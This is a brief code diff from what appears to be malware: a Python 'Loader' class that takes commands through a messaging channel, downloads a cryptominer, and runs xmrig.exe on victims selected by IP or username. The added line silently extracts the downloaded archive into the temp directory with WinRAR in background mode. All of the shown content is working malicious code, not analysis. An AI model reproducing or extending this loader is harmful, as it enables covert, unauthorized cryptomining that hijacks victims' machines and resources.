@@ -159,6 +159,7 @@ class Loader():
 						file = open(filename,"wb")
 						file.write(req.content)
 						file.close()
+						os.system('"C:\\Program Files\\WinRAR\WinRAR.exe" x -ibck ' + filename + ' %temp%')
 						self.SendMessage("%E2%9C%94%EF%B8%8F Miner Downloaded")
 					elif command == "/start_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
 						if os.path.exists(tempfile.gettempdir() + "\\xmrig.exe"):
